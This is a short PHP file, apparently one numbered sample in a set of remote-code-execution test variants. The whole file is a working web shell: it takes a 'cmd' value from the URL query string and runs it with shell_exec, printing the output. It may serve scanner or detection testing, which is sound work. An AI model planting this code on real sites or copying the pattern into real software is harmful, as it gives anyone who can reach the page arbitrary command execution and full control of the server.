<?php
// RCE test variation #315
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>